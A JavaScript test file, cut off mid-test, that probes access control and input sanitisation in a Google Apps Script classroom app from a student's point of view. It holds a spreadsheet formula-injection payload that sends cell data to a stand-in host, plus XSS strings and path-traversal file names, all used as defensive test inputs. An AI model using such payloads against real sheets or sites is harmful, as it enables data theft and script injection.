// Attacks gas/Code.gs the way a curious student with the browser console could.
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { createServer } from './fake-gas.mjs';

const OWNER = 'teacher@school.test';
const OTHER = 'other.teacher@school.test';
const ARI = 'ari@school.test';
const BEA = 'bea@school.test';
const ZED = 'zed@school.test';
const STRANGER = 'stranger@school.test';

function setup() {
  const server = createServer({ owner: OWNER });
  const teacher = server.as(OWNER);
  const cls = teacher('createClass', 'Period 3');
  teacher('addStudents', cls.id, [`Ari M, ${ARI}`, `Bea T <${BEA}>`]);
  teacher('setMusicOpen', cls.id, true);
  // Add a second teacher the way a person would: a row in the Teachers tab.
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const other = server.as(OTHER);
  const clsB = other('createClass', 'Other class');
  other('addStudents', clsB.id, [ZED]);
  other('setMusicOpen', clsB.id, true);
  const ari = server.as(ARI);
  const bea = server.as(BEA);
  const zed = server.as(ZED);
  const ids = Object.fromEntries(teacher('listStudents', cls.id).map((s) => [s.username, s.id]));
  ari('saveWork', 't1', { code: 'ARI SECRET CODE', assets: {} });
  const beaWork = bea('submitWork', 't1', { code: 'BEA CODE', assets: {}, reflection: 'BEA REFLECTION', auto_ok: true });
  teacher('saveGrade', beaWork.id, { scores: { works: 4 }, total: 4, max_total: 12, feedback: 'PRIVATE FEEDBACK', status: 'approved' });
  return { server, teacher, other, ari, bea, zed, cls, clsB, ids, beaWork };
}
const denied = (fn) => assert.throws(fn);

test('only the two entry points can be called from a browser', () => {
  const { server } = setup();
  assert.deepEqual(server.publicFunctions().sort(), ['api', 'dailyProgressEmail', 'doGet']);
});

test('someone on no roster gets no access and no data', () => {
  const { server, cls } = setup();
  assert.equal(server.as(STRANGER)('session').role, null);
  for (const m of ['classBoard', 'myWorks', 'listClasses', 'arcade']) denied(() => server.as(STRANGER)(m, cls.id));
});

test('a signed-out request gets nothing', () => {
  const { server, cls } = setup();
  assert.equal(server.as('')('session').role, null);
  denied(() => server.as('')('classBoard', cls.id));
});

test('the deploying teacher becomes a teacher automatically, and email case does not matter', () => {
  const { server } = setup();
  assert.equal(server.as('TEACHER@school.test')('session').role, 'teacher');
  assert.equal(server.as('ARI@SCHOOL.TEST')('session').role, 'student');
});

test('a student cannot use any teacher action', () => {
  const { ari, cls, ids, beaWork } = setup();
  denied(() => ari('listClasses'));
  denied(() => ari('listStudents', cls.id));
  denied(() => ari('classWork', cls.id));
  denied(() => ari('getWorkFull', beaWork.id));
  denied(() => ari('saveGrade', beaWork.id, { status: 'approved' }));
  denied(() => ari('giveAward', ids[ARI], 'helper', ''));
  denied(() => ari('addStudents', cls.id, ['x@school.test']));
  denied(() => ari('removeStudent', ids[BEA]));
  denied(() => ari('setStudentPath', ids[ARI], 'arcade'));
  denied(() => ari('teacherUnshare', beaWork.id));
});

test('a student only ever receives their own code and grades', () => {
  const { ari, bea } = setup();
  const mine = ari('myWorks');
  assert.equal(mine.length, 1);
  assert.equal(mine[0].code, 'ARI SECRET CODE');
  assert.equal(mine[0].grade, null);
  assert.equal(bea('myWorks')[0].grade.feedback, 'PRIVATE FEEDBACK');
});

test('the class board shows progress but no code, grades, reflections, or emails', () => {
  const { ari, cls } = setup();
  const text = JSON.stringify(ari('classBoard', cls.id));
  for (const secret of ['BEA CODE', 'ARI SECRET', 'PRIVATE FEEDBACK', 'BEA REFLECTION', '@school.test']) assert.ok(!text.includes(secret), secret);
  assert.ok(text.includes('Bea T'));
});

test('a student cannot see another class', () => {
  const { zed, cls } = setup();
  denied(() => zed('classBoard', cls.id));
  denied(() => zed('arcade', cls.id));
  denied(() => zed('listSprites', cls.id));
});

test('a teacher cannot see or change another teacher\'s class', () => {
  const { other, cls, ids, beaWork } = setup();
  denied(() => other('getClass', cls.id));
  denied(() => other('listStudents', cls.id));
  denied(() => other('classBoard', cls.id));
  denied(() => other('classWork', cls.id));
  denied(() => other('getWorkFull', beaWork.id));
  denied(() => other('saveGrade', beaWork.id, { status: 'approved' }));
  denied(() => other('removeStudent', ids[ARI]));
  denied(() => other('deleteClass', cls.id));
  denied(() => other('addStudents', cls.id, ['x@school.test']));
  denied(() => other('giveAward', ids[ARI], 'helper', ''));
  assert.equal(other('listClasses').length, 1);
});

test('a student cannot approve their own work or forge fields', () => {
  const { ari, teacher, cls } = setup();
  const w = ari('saveWork', 't2', { code: 'x', assets: {}, status: 'approved', shared: true, student_id: 'someone-else', stretch_done: 99 });
  assert.equal(w.status, 'in_progress');
  assert.equal(w.shared, false);
  assert.equal(w.stretch_done, 3);
  const all = teacher('classWork', cls.id).filter((x) => x.lesson_id === 't2');
  assert.equal(all.length, 1);
  assert.notEqual(all[0].student_id, 'someone-else');
});

test('approved work is locked, and returned work can be fixed and resubmitted', () => {
  const { bea, teacher, beaWork } = setup();
  denied(() => bea('saveWork', 't1', { code: 'changed' }));
  denied(() => bea('submitWork', 't1', { code: 'changed' }));
  teacher('saveGrade', beaWork.id, { scores: {}, total: 1, max_total: 12, feedback: 'Fix it', status: 'returned' });
  assert.equal(bea('saveWork', 't1', { code: 'fixed', assets: {} }).status, 'returned');
  assert.equal(bea('submitWork', 't1', { code: 'fixed', assets: {} }).status, 'submitted');
});

test('a student can change their look but not their name, and picks a road only once', () => {
  const { ari, teacher, cls, ids } = setup();
  const s = ari('updateProfile', { avatar: { hat: 'cap' }, display_name: 'Hacker', class_id: 'x', email: 'bea@school.test', path: 'arcade', game_name: 'Mine' });
  assert.equal(s.display_name, 'Ari M');
  assert.equal(s.class_id, cls.id);
  assert.equal(s.avatar.hat, 'cap');
  assert.equal(ari('session').student.username, ARI);
  denied(() => ari('updateProfile', { path: 'platformer' }));
  denied(() => ari('updateProfile', { avatar: { junk: 'x'.repeat(3000) } }));
  teacher('setStudentPath', ids[ARI], 'platformer');
  assert.equal(ari('session').student.path, 'platformer');
});

test('nobody can inject a formula into the Sheet', () => {
  const { ari, teacher, cls } = setup();
  const formula = '=IMPORTXML("https://evil.test/?"&A1,"//a")';
  const w = ari('saveWork', 't3', { code: formula, assets: {}, reflection: formula });
  ari('updateProfile', { game_name: formula });
  teacher('addStudents', cls.id, [`=HYPERLINK("x"), new@school.test`]);
  teacher('createClass', formula);
  assert.equal(ari('myWorks').find((x) => x.id === w.id).reflection, formula);
  assert.equal(ari('session').student.game_name, formula);
});

test('long programs survive the 50,000 character cell limit, intact', () => {
  const { ari } = setup();
  const code = `// ${'x'.repeat(120000)}\n=weird`;
  ari('saveWork', 't4', { code, assets: { hero: 'data:image/png;base64,AAAA' } });
  const w = ari('myWorks').find((x) => x.lesson_id === 't4');
  assert.equal(w.code, code);
  assert.equal(w.assets.hero, 'data:image/png;base64,AAAA');
  denied(() => ari('saveWork', 't5', { code: 'x'.repeat(600000) }));
});

test('projects can hold extra code files, with safe names only', () => {
  const { ari, bea, cls, teacher } = setup();
  const files = { 'helpers.js': 'function hi() {}', 'sketch.js': 'x', '../evil.js': 'x', 'a b.js': 'x', 'notes.txt': 'x' };
  const saved = ari('saveWork', 't2', { code: 'hi();', assets: {}, files });
  assert.deepEqual(saved.files, { 'helpers.js': 'function hi() {}' });
  assert.equal(ari('myWorks').find((w) => w.lesson_id === 't2').files['helpers.js'], 'function hi() {}');
  const w = teacher('classWork', cls.id).find((x) => x.lesson_id === 't2');
  assert.equal(teacher('getWorkFull', w.id).files['helpers.js'], 'function hi() {}');
  ari('setShared', 't2', true);
  assert.equal(bea('arcade', cls.id).find((g) => g.lesson_id === 't2').files['helpers.js'], 'function hi() {}');
  const many = Object.fromEntries(Array.from({ length: 12 }, (_, i) => [`f${i}.js`, 'x']));
  assert.equal(Object.keys(ari('saveWork', 't3', { code: '', assets: {}, files: many }).files).length, 8);
});

test('special characters and quotes come back exactly', () => {
  const { ari } = setup();
  const code = 'text("héllo \\"é\\" 🎮", 1, 2);\n\t~tilde\n+plus\n@at';
  ari('saveWork', 't6', { code, assets: {}, reflection: '~leading tilde' });
  const w = ari('myWorks').find((x) => x.lesson_id === 't6');
  assert.equal(w.code, code);
  assert.equal(w.reflection, '~leading tilde');
});

test('reading the board does not load stored code', () => {
  const { server, ari, cls } = setup();
  ari('saveWork', 't2', { code: 'y'.repeat(100000), assets: {} });
  const works = server.sheets.get('Works');
  const orig = works.getRange.bind(works);
  let widest = 0;
  works.getRange = (r, c, nr, nc) => { widest = Math.max(widest, nc || 1); return orig(r, c, nr, nc); };
  ari('classBoard', cls.id);
  assert.ok(widest <= 14, `read ${widest} columns`);
});

test('a daily plan is the teacher\'s alone, and bad input is cleaned', () => {
  const { teacher, other, ari, cls } = setup();
  denied(() => ari('getClassPlan', cls.id));
  denied(() => ari('saveClassPlan', cls.id, { question: 'x' }));
  denied(() => other('getClassPlan', cls.id));
  denied(() => other('saveClassPlan', cls.id, { question: 'x' }));
  const saved = teacher('saveClassPlan', cls.id, { day: '2026-11-08', question: `=BAD()${'x'.repeat(400)}`, focus: 'Keep going', standards: ['6-8.CT.b.5', 'junk', '<b>'], timer_end: 'not a date' });
  assert.equal(saved.question.length, 200);
  assert.deepEqual(saved.standards, ['6-8.CT.b.5']);
  assert.equal(saved.timer_end, '');
  teacher('saveClassPlan', cls.id, { day: '2026-11-08', question: 'Second', timer_end: '2026-11-08T15:00:00Z' });
  const plan = teacher('getClassPlan', cls.id);
  assert.equal(plan.question, 'Second');
  assert.equal(plan.lesson, '');
  assert.equal(teacher('saveClassPlan', cls.id, { day: '2026-11-08', lesson: 'c3' }).lesson, 'c3');
  assert.equal(teacher('saveClassPlan', cls.id, { day: '2026-11-08', lesson: '=EVIL()' }).lesson, '');
  assert.equal(plan.timer_end, '2026-11-08T15:00:00.000Z');
});

test('the class board gives dates for achievements, and still no private details', () => {
  const { ari, cls } = setup();
  const b = ari('classBoard', cls.id).find((s) => s.display_name === 'Bea T');
  assert.ok(b.works[0].submitted_at);
  assert.ok(!JSON.stringify(b).includes('PRIVATE FEEDBACK'));
});

const person = (id, name, email) => ({ userId: id, profile: { name: { fullName: name }, emailAddress: email } });
const classroomData = () => ({
  courses: [{ id: 'c1', name: 'Game Design', section: 'P3' }, { id: 'c2', name: 'Robotics' }, { id: 'c3', name: 'Art' }],
  rosters: {
    c1: [person('g1', 'Ava Marie Lopez', 'ava@school.test'), person('g2', 'Ben Tran', 'ben@school.test'), person('g3', 'Cy', 'cy@school.test'), person('g4', 'No Email', '')],
    c2: [person('g2', 'Ben Tran', 'ben@school.test'), person('g5', 'Dee Fox', 'dee@school.test')],
  },
  work: { c1: [{ id: 'w1', title: 'Essay', alternateLink: 'https://cr/w1', dueDate: { year: 2020, month: 1, day: 1 } }, { id: 'w2', title: 'Quiz', alternateLink: 'https://cr/w2', dueDate: { year: 2099, month: 1, day: 1 } }, { id: 'w3', title: 'Poster', alternateLink: 'https://cr/w3' }] },
  subs: { c1: [
    { userId: 'g1', courseWorkId: 'w1', state: 'CREATED' }, { userId: 'g1', courseWorkId: 'w2', state: 'CREATED' }, { userId: 'g1', courseWorkId: 'w3', state: 'TURNED_IN', late: true },
    { userId: 'g2', courseWorkId: 'w1', state: 'RETURNED', assignedGrade: 9 }, { userId: 'g2', courseWorkId: 'w3', state: 'TURNED_IN' },
    { userId: 'stranger', courseWorkId: 'w1', state: 'CREATED' },
  ] },
});

function classroomSetup() {
  const server = createServer({ owner: OWNER, classroom: classroomData() });
  const t = server.as(OWNER);
  t('listClasses');
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const [r] = t('importCourses', ['c1']);
  return { server, t, r, cid: r.class_id };
}

test('importing brings in a course across pages, with last initials only', () => {
  const { t, r, cid } = classroomSetup();
  assert.equal(r.added, 3);
  assert.equal(r.skipped.length, 1);
  const names = t('listStudents', cid).map((s) => s.display_name).sort();
  assert.deepEqual(names, ['Ava L', 'Ben T', 'Cy']);
  assert.ok(!JSON.stringify(t('classBoard', cid)).includes('Lopez'));
  assert.equal(t('listGoogleCourses').find((c) => c.id === 'c1').linked, true);
  assert.equal(t('listGoogleCourses').length, 3);
});

test('importing again adds only new students, and reports who left without removing them', () => {
  const data = classroomData();
  const server = createServer({ owner: OWNER, classroom: data });
  const t = server.as(OWNER);
  const [first] = t('importCourses', ['c1']);
  data.rosters.c1 = data.rosters.c1.filter((p) => p.userId !== 'g3').concat(person('g9', 'New Kid', 'new@school.test'));
  const [again] = t('importCourses', ['c1']);
  assert.equal(again.class_id, first.class_id);
  assert.equal(again.added, 1);
  assert.equal(again.matched, 2);
  assert.equal(again.gone, 1);
  assert.equal(t('listStudents', first.class_id).length, 4);
  assert.equal(t('listClasses').length, 1);
});

test('a student in two courses is reported, not duplicated', () => {
  const { t } = classroomSetup();
  const [r] = t('importCourses', ['c2']);
  assert.equal(r.added, 1);
  assert.ok(r.skipped.some((x) => x.includes('already in another class')));
});

test('only the deploying teacher can reach Google Classroom', () => {
  const { server, cid } = classroomSetup();
  const other = server.as(OTHER);
  const student = server.as('ava@school.test');
  denied(() => other('listGoogleCourses'));
  denied(() => other('importCourses', ['c1']));
  denied(() => other('classroomWork', cid));
  denied(() => other('setDigest', true));
  denied(() => other('classAlerts', cid));
  denied(() => student('listGoogleCourses'));
  denied(() => student('importCourses', ['c1']));
  denied(() => student('classroomWork', cid));
  denied(() => student('classAlerts', cid));
  denied(() => student('getPace', cid));
  denied(() => student('savePace', cid, {}));
  denied(() => server.as(OWNER)('importCourses', ['not-mine']));
});

test('assignments show each student\'s status, across pages', () => {
  const { t, cid } = classroomSetup();
  const data = t('classroomWork', cid);
  assert.equal(data.assignments.length, 3);
  const ava = data.students.find((s) => s.display_name === 'Ava L');
  assert.equal(ava.cells.w1.state, 'missing');
  assert.equal(ava.cells.w2.state, 'assigned');
  assert.equal(ava.cells.w3.state, 'late');
  assert.equal(ava.missing, 1);
  const ben = data.students.find((s) => s.display_name === 'Ben T');
  assert.equal(ben.cells.w1.state, 'graded');
  assert.equal(ben.cells.w1.grade, 9);
  assert.equal(ben.cells.w3.state, 'done');
});

test('alerts include Classroom work, and an email goes only to the deploying teacher', () => {
  const { server, t, cid } = classroomSetup();
  const yearAgo = new Date(Date.now() - 86400000 * 100).toISOString().slice(0, 10);
  const soon = new Date(Date.now() + 86400000 * 5).toISOString().slice(0, 10);
  t('savePace', cid, { term_start: yearAgo, term_end: soon });
  const a = t('classAlerts', cid, true).students.find((s) => s.display_name === 'Ava L');
  assert.equal(a.level, 'behind');
  assert.ok(a.reasons.some((r) => r.includes('missing in Classroom')));
  denied(() => server.run('ava@school.test', 'dailyProgressEmail'));
  assert.equal(server.mail.length, 0);
  const day = new Date().getDay();
  server.run(OWNER, 'dailyProgressEmail');
  server.run(OWNER, 'dailyProgressEmail');
  if (day !== 0 && day !== 6) {
    assert.equal(server.mail.length, 1, 'one email per day');
    assert.equal(server.mail[0].to, OWNER);
    assert.ok(server.mail[0].body.includes('Ava L'));
    assert.ok(!server.mail[0].body.includes('Lopez'));
  }
  t('setDigest', true);
  t('setDigest', true);
  assert.equal(server.triggers.length, 1);
  assert.equal(t('getDigest').on, true);
  t('setDigest', false);
  assert.equal(t('getDigest').on, false);
});

test('pace dates are checked', () => {
  const { t, cid } = classroomSetup();
  t('savePace', cid, { term_start: '<b>', term_end: '2026-12-20' });
  assert.deepEqual(t('getPace', cid), { term_start: '', term_end: '2026-12-20' });
});

test('sharing is visible inside the class only, and a teacher can take it down', () => {
  const { ari, bea, zed, teacher, cls } = setup();
  ari('setShared', 't1', true);
  const games = bea('arcade', cls.id);
  assert.equal(games.length, 1);
  assert.equal(games[0].code, 'ARI SECRET CODE');
  assert.equal(games[0].student.display_name, 'Ari M');
  assert.ok(!JSON.stringify(games).includes('@school.test'));
  denied(() => zed('arcade', cls.id));
  teacher('teacherUnshare', games[0].id);
  assert.equal(bea('arcade', cls.id).length, 0);
});

function teamSetup() {
  const s = setup();
  const named = (n) => s.teacher('listStudents', s.cls.id).find((x) => x.display_name.startsWith(n)).id;
  return { ...s, ariId: named('Ari'), beaId: named('Bea') };
}

test('groups: 2 or 3 from one class, set only by the teacher', () => {
  const { teacher, other, ari, cls, ariId, beaId } = teamSetup();
  denied(() => teacher('saveTeams', cls.id, 'c6', [[ariId]]));
  denied(() => teacher('saveTeams', cls.id, 'c6', [[ariId, ariId]]));
  denied(() => teacher('saveTeams', cls.id, 'c6', [[ariId, 'someone-else']]));
  denied(() => ari('saveTeams', cls.id, 'c6', [[ariId, beaId]]));
  denied(() => other('saveTeams', cls.id, 'c6', [[ariId, beaId]]));
  denied(() => ari('listTeams', cls.id));
  denied(() => other('listTeams', cls.id));
  denied(() => teacher('saveTeams', cls.id, 'p1', [[ariId, beaId]]));
  teacher('saveTeams', cls.id, 'c6', [[ariId, beaId]]);
  assert.equal(teacher('listTeams', cls.id).length, 1);
});

test('groups: one person per file, shared code, and each line credited to who typed it', () => {
  const { teacher, ari, bea, zed, cls, ariId, beaId } = teamSetup();
  teacher('saveTeams', cls.id, 'c6', [[ariId, beaId]]);
  assert.equal(zed('teamFor', 'c6', null, {}), null);
  denied(() => zed('takeKeyboard', 'c6', null));

  ari('takeKeyboard', 'c6', { code: 'starter();', assets: {}, files: {} });
  denied(() => bea('takeKeyboard', 'c6', null));

  ari('saveWork', 'c6', { code: 'starter();\nariLine();\nariTwo();', assets: {}, files: {} });
  assert.match(bea('teamFor', 'c6', null, {}).doc.code, /ariTwo/);

  // Someone not at the keyboard can't change the code, and can't get credit for it.
  const blocked = bea('saveWork', 'c6', { code: 'beaTakesOver();', assets: {}, files: {}, reflection: 'mine' });
  assert.equal(blocked.team_lost, true);
  assert.match(blocked.code, /ariLine/);
  assert.equal(blocked.reflection, 'mine');

  ari('passKeyboard', 'c6');
  bea('takeKeyboard', 'c6', null);
  bea('saveWork', 'c6', { code: 'starter();\nariLine();\nbeaLine();', assets: {}, files: {} });

  const [team] = teacher('listTeams', cls.id);
  const stats = (id) => team.members.find((m) => m.id === id);
  assert.equal(team.starter_lines, 1, 'starter code is nobody\'s contribution');
  assert.equal(stats(ariId).lines, 1);
  assert.equal(stats(beaId).lines, 1);
  assert.equal(stats(ariId).added, 2);
  assert.equal(stats(beaId).removed, 1);

  // Contribution records are for the teacher, and each student reports for themselves.
  denied(() => bea('submitWork', 'c6', { reflection: 'done' }));
  bea('submitWork', 'c6', { reflection: 'done', contribution: 'I fixed the ending.' });
  assert.equal(JSON.stringify(ari('teamFor', 'c6', null, {})).includes('fixed the ending'), false);
  assert.equal(teacher('listTeams', cls.id)[0].members.find((m) => m.id === beaId).note, 'I fixed the ending.');
});

test('groups: members edit different files at the same time without overwriting each other', () => {
  const { teacher, ari, bea, cls, ariId, beaId } = teamSetup();
  teacher('saveTeams', cls.id, 'c6', [[ariId, beaId]]);
  ari('takeKeyboard', 'c6', { code: 'setup();', assets: {}, files: {} }, 'sketch.js');
  denied(() => bea('takeKeyboard', 'c6', null, 'sketch.js'));
  denied(() => bea('takeKeyboard', 'c6', null, '../evil'));

  // Bea makes her own file while Ari types in sketch.js. Making it gives her its keyboard.
  const b1 = bea('saveWork', 'c6', { code: 'setup();', assets: {}, files: { 'enemies.js': 'function enemy() {}' } });
  assert.equal(b1.team_lost, false);
  assert.equal(bea('teamFor', 'c6', null, {}).holders['enemies.js'], beaId);

  // Both save at once, each with a stale copy of the other's file. Neither overwrites the other.
  const a2 = ari('saveWork', 'c6', { code: 'setup();\nari();', assets: {}, files: {} });
  assert.equal(a2.team_lost, true, 'Ari\'s browser had no enemies.js yet, so it is told to catch up');
  bea('saveWork', 'c6', { code: 'setup();', assets: {}, files: { 'enemies.js': 'function enemy() {}\nfunction boss() {}' } });
  const doc = ari('teamFor', 'c6', null, {}).doc;
  assert.equal(doc.code, 'setup();\nari();', 'Bea\'s stale sketch.js did not undo Ari\'s line');
  assert.match(doc.files['enemies.js'], /boss/, 'Ari\'s missing enemies.js did not delete Bea\'s file');

  // Ari can't edit Bea's file, even by sending it.
  ari('saveWork', 'c6', { code: 'setup();\nari();', assets: {}, files: { 'enemies.js': 'hacked' } });
  assert.match(ari('teamFor', 'c6', null, {}).doc.files['enemies.js'], /boss/);

  // Letting go of a file frees it for a teammate.
  bea('passKeyboard', 'c6', 'enemies.js');
  ari('takeKeyboard', 'c6', null, 'enemies.js');
  ari('saveWork', 'c6', { code: 'setup();\nari();', assets: {}, files: { 'enemies.js': 'function enemy() {}\nfunction boss() {}\nfunction ariBoss() {}' } });
  const team = teacher('listTeams', cls.id)[0];
  assert.ok(team.members.find((m) => m.id === beaId).lines >= 2, 'Bea is credited for her lines');
  assert.ok(team.members.find((m) => m.id === ariId).lines >= 2, 'Ari is credited for hers');
  // Each member's own record holds the merged project, for grading.
  assert.match(teacher('getWorkFull', teacher('classWork', cls.id).find((w) => w.lesson_id === 'c6' && w.student_id === beaId).id).files['enemies.js'], /ariBoss/);
});

test('a group grade can go to teammates who submitted, and only them', () => {
  const { teacher, ari, bea, cls, ariId, beaId } = teamSetup();
  teacher('saveTeams', cls.id, 'c6', [[ariId, beaId]]);
  ari('takeKeyboard', 'c6', { code: 'x();', assets: {}, files: {} });
  const a = ari('submitWork', 'c6', { code: 'x();\ny();', assets: {}, files: {}, contribution: 'I typed.' });
  teacher('saveGrade', a.id, { scores: {}, total: 10, max_total: 12, feedback: '', status: 'approved', to_team: true });
  const works = teacher('classWork', cls.id).filter((w) => w.lesson_id === 'c6');
  assert.equal(works.find((w) => w.student_id === ariId).status, 'approved');
  assert.notEqual(works.find((w) => w.student_id === beaId)?.status, 'approved');
  bea('submitWork', 'c6', { contribution: 'I tested.' });
  const b = teacher('classWork', cls.id).find((w) => w.lesson_id === 'c6' && w.student_id === beaId);
  teacher('saveGrade', b.id, { scores: {}, total: 9, max_total: 12, feedback: '', status: 'approved' });
  assert.equal(teacher('classWork', cls.id).find((w) => w.id === b.id).grade.total, 9, 'students can get different grades');
});

test('named assignments are made ahead, and grades go to them scaled to their points', () => {
  const data = classroomData();
  const server = createServer({ owner: OWNER, classroom: data });
  const t = server.as(OWNER);
  t('listClasses');
  server.sheets.get('Teachers').appendRow([OTHER, 'Other', '2026-01-01']);
  const [r] = t('importCourses', ['c1']);
  const s = server.as('ava@school.test');
  const L1 = { key: 'L1', ids: ['t1'] };
  const L6 = { key: 'L6', ids: ['p1', 'a1', 's1', 'm1'] };
  const item = { ...L1, title: 'Hello, Canvas', points: 100, due: '2030-01-15', description: 'Draw a scene.' };

  // Only the deploying teacher, on their own class, with sensible input.
  denied(() => s('createAssignments', r.class_id, [item], { publish: true }));
  denied(() => server.as(OTHER)('createAssignments', r.class_id, [item], { publish: true }));
  denied(() => t('createAssignments', r.class_id, [{ ...item, key: 'x1' }], {}));
  denied(() => s('pushGrades', r.class_id, [L1]));
  assert.equal(t('createAssignments', r.class_id, [{ ...item, title: ' ' }], {}).failed.length, 1);
  assert.equal(t('createAssignments', r.class_id, [{ ...item, due: 'soon' }], {}).failed.length, 1);

  // Made before anyone has been graded, with the teacher's name, points, and due date.
  const made = t('createAssignments', r.class_id, [item, { ...L6, title: 'Unit 2: First Fork', points: 12, due: '' }], { publish: true });
  assert.equal(made.created, 2);
  assert.equal(data.created[0].title, 'Hello, Canvas');
  assert.equal(data.created[0].state, 'PUBLISHED');
  assert.equal(data.created[0].maxPoints, 100);
  assert.ok(data.created[0].dueDate && data.created[0].dueTime);
  assert.equal(data.created[1].dueDate, undefined, 'due date is optional');
  // The link opens that stop, and without the topics permission the assignment is still made, with no topic.
  assert.equal(data.created[0].materials[0].link.url, 'https://script.test/exec?stop=L1');
  assert.equal(data.created[1].materials[0].link.url, 'https://script.test/exec?stop=L6');
  assert.equal(made.topic, false);
  assert.equal(data.created[0].topicId, undefined);
  assert.equal(data.created[0].description, 'Draw a scene.');
  assert.equal(t('createAssignments', r.class_id, [item], {}).skipped.length, 1, 'no second copy');
  const drafts = t('createAssignments', r.class_id, [{ key: 'L2', ids: ['t3'], title: 'It Moves!', points: 10 }], {});
  assert.equal(drafts.created, 1);
  assert.equal(data.created[2].state, 'DRAFT');

  let status = t('gradeSyncStatus', r.class_id, [L1, L6]);
  assert.equal(status.items[0].synced, true);
  assert.equal(status.items[0].title, 'Hello, Canvas');
  assert.equal(status.items[0].waiting, 0);

  // Grade in the app, then one button sends everything that changed.
  data.madeSubs = { c1: [{ id: 'sub1', userId: 'g1', courseWorkId: 'made-1' }, { id: 'sub2', userId: 'g1', courseWorkId: 'made-2' }] };
  const w = s('submitWork', 't1', { code: 'a', assets: {} });
  t('saveGrade', w.id, { scores: {}, total: 9, max_total: 12, feedback: 'SECRET', status: 'approved' });
  t('setStudentPath', t('listStudents', r.class_id)[0].id, 'adventure');
  const w2 = s('submitWork', 'a1', { code: 'b', assets: {} });
  t('saveGrade', w2.id, { scores: {}, total: 12, max_total: 12, feedback: '', status: 'approved' });
  assert.equal(t('gradeSyncStatus', r.class_id, [L1, L6]).items[0].waiting, 1);
  const out = t('pushGrades', r.class_id, [L1, L6]);
  assert.equal(out.sent, 2);
  assert.deepEqual(data.patched[0], { courseId: 'c1', workId: 'made-1', subId: 'sub1', draftGrade: 75, assignedGrade: 75 });
  assert.equal(data.patched[1].draftGrade, 12, 'a road lesson counts toward its lesson number');
  assert.equal(JSON.stringify(data.created).includes('SECRET'), false, 'feedback stays private');
  status = t('gradeSyncStatus', r.class_id, [L1, L6]);
  assert.equal(status.items[0].waiting + status.items[1].waiting, 0);
  assert.equal(t('pushGrades', r.class_id, [L1, L6]).sent, 0, 'nothing changed, nothing sent');

  // A changed grade goes again, to the same assignment.
  t('saveGrade', w.id, { scores: {}, total: 12, max_total: 12, feedback: '', status: 'approved' });
  t('pushGrades', r.class_id, [L1, L6]);
  assert.equal(data.created.length, 3);
  assert.equal(data.patched[2].assignedGrade, 100);
});

test('song rules: only real notes, owner edits, class sees published, teacher can remove', () => {
  const { ari: lyra, bea: milo, zed, teacher, cls } = setup();
  const data = JSON.stringify({ tempo: 120, scale: 'bright', lead: 'C5 . E5', bass: '', drums: 'k . s' });
  denied(() => lyra('saveSong', { name: 'bad', data: JSON.stringify({ lead: '";alert(1);//' }) }));
  denied(() => lyra('saveSong', { name: 'bad', data: 'not json' }));
  const s = lyra('saveSong', { name: 'theme', data, published: false });
  assert.equal(milo('listSongs', cls.id).length, 0);
  lyra('saveSong', { ...s, published: true });
  assert.equal(JSON.parse(milo('listSongs', cls.id)[0].data).lead, 'C5 . E5');
  denied(() => milo('saveSong', { ...s, name: 'stolen' }));
  denied(() => milo('deleteSong', s.id));
  denied(() => zed('listSongs', cls.id));
  teacher('deleteSong', s.id);
  assert.equal(lyra('mySongs').length, 0);
});

test('sprite rules: must be an image, owner edits, class sees published, teacher can remove', () => {
  const { ari, bea, zed, teacher, cls } = setup();
  const png = 'data:image/png;base64,AAAA';
  denied(() => ari('saveSprite', { name: 'bad', data_url: 'javascript:alert(1)' }));
  const s = ari('saveSprite', { name: 'hero', data_url: png, frames: 2, w: 16, h: 16, published: false });
  assert.equal(bea('listSprites', cls.id).length, 0);
  ari('saveSprite', { ...s, published: true });
  assert.equal(bea('listSprites', cls.id)[0].data_url, png);
  assert.equal(zed('mySprites').length, 0);
  denied(() => bea('saveSprite', { ...s, name: 'stolen' }));
  denied(() => bea('deleteSprite', s.id));
  const forged = bea('saveSprite', { name: 'mine', data_url: png, class_id: 'other', student_id: 'x', teacher_email: OWNER });
  assert.equal(forged.student_id, teacher('classBoard', cls.id).find((b) => b.display_name === 'Bea T').id);
  assert.equal(forged.class_id, cls.id);
  teacher('deleteSprite', s.id);
  assert.equal(ari('mySprites').length, 0);
});

test('rosters reject bad lines and duplicates without adding anyone', () => {
  const { teacher, cls } = setup();
  const before = teacher('listStudents', cls.id).length;
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', 'no email here']));
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', ARI]));
  denied(() => teacher('addStudents', cls.id, ['new1@school.test', 'NEW1@school.test']));
  denied(() => teacher('addStudents', cls.id, [OWNER]));
  assert.equal(teacher('listStudents', cls.id).length, before);
  teacher('addStudents', cls.id, ['Cam R\tcam@school.test', 'dee@school.test']);
  const names = teacher('listStudents', cls.id).map((s) => s.display_name);
  assert.ok(names.includes('Cam R') && names.includes('dee'));
});

test('removing a student deletes everything of theirs and ends their access', () => {
  const { server, ari, bea, teacher, cls, ids } = setup();
  ari('saveSprite', { name: 'h', data_url: 'data:image/png;base64,AA', published: true });
  teacher('giveAward', ids[ARI], 'helper', 'nice');
  teacher('removeStudent', ids[ARI]);
  assert.equal(server.as(ARI)('session').role, null);
  assert.equal(bea('listSprites', cls.id).length, 0);
  assert.ok(!teacher('classWork', cls.id).some((w) => w.student_id === ids[ARI]));
  assert.equal(server.sheets.get('Awards').getLastRow(), 1);
});

test('deleting a class removes its data, and leaves other classes alone', () => {
  const { server, teacher, other, zed, cls, clsB } = setup();
  zed('saveWork', 't1', { code: 'ZED', assets: {} });
  teacher('deleteClass', cls.id);
  assert.equal(server.as(ARI)('session').role, null);
  assert.equal(server.sheets.get('Grades').getLastRow(), 1);
  assert.equal(zed('myWorks')[0].code, 'ZED');
  assert.equal(other('listStudents', clsB.id).length, 1);
});

test('it also works as a standalone script, creating its own Sheet once', () => {
  const server = createServer({ owner: OWNER, bound: false });
  const t = server.as(OWNER);
  t('createClass', 'A');
  t('createClass', 'B');
  assert.equal(server.createdCount(), 1);
  assert.equal(t('listClasses').length, 2);
});

test('the built files load the way Apps Script loads them', () => {
  const server = createServer({ owner: OWNER, codeFile: '../dist/Code.gs', htmlDir: '../dist' });
  for (const name of ['Styles', 'P5', 'App']) assert.ok(server.run(OWNER, 'include_', name).length > 1000, name);
  const teacher = server.as(OWNER);
  const cls = teacher('createClass', 'P');
